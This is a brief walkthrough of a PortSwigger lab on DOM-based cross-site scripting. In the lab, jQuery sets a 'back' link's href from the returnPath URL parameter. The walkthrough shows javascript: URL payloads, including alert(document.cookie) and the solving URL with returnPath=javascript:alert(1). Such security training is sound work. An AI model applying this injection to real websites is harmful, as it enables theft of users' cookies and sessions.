# Lab: DOM XSS in jQuery anchor href attribute sink using location.search source - [Link](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

### Description

This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.
To solve this lab, make the "back" link alert document.cookie..

---

* Normally, an `<a>` tag contains a safe URL:

  ```html
  <a href="/home">Back</a>
  ```
* If the `href` starts with `javascript:`, the browser will execute the code when the link is clicked:

  ```html
  <a href="javascript:alert(document.cookie)">Back</a>
  ```
* Since the lab’s code sets `href` directly from user input, we can inject JavaScript.

---

### Steps to solve

1. Navigate to the feedback page.
2. Modify the URL to inject a JavaScript payload into the `returnPath` parameter:

   ```
   https://<lab-id>.web-security-academy.net/feedback?returnPath=javascript:alert(1)
   ```
3. Press Enter to load the page.
4. It will execute `alert(1)`.

**Lab Solved**
